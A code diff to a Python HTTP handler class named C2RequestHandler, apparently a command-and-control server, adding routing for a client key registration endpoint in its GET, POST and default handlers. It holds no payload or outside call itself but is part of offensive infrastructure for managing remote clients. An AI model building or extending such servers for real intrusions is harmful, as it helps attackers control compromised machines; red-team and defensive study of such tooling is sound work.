@@ -61,6 +61,12 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         # Log the request
         self.log_message(f"Received GET request for {self.path}")
 
+        # Check for key registration endpoint first
+        if self.path == "/client/service/registration":
+            self.external_logger(f"Direct routing to key registration handler for GET {self.path}")
+            self.operation_router.key_registration_handler.handle()
+            return
+
         # Extract base path without query string for routing
         base_path = self.path.split('?')[0] if '?' in self.path else self.path
         
@@ -85,6 +91,12 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # Log the request
         self.log_message(f"Received POST request for {self.path}")
+        
+        # Check for key registration endpoint first
+        if self.path == "/client/service/registration":
+            self.external_logger(f"Direct routing to key registration handler for POST {self.path}")
+            self.operation_router.key_registration_handler.handle()
+            return
         
         # Check if this path is in our valid path pool
         endpoint_type = self.path_router.get_endpoint_type(self.path)
@@ -170,6 +182,14 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
     
     def _handle_default(self):
         """Handle default/unmatched paths with a generic response"""
+        # Check for key registration endpoint before standard default handling
+        if self.path == "/client/service/registration":
+            # Ensure key registration requests are properly routed even if not in path pool
+            if hasattr(self, 'operation_router') and hasattr(self.operation_router, 'key_registration_handler'):
+                self.operation_router.key_registration_handler.handle()
+                return
+        
+        # Standard default response for other paths
         self.send_response(200)
         self.send_header("Content-type", "text/html")
         self.end_headers()
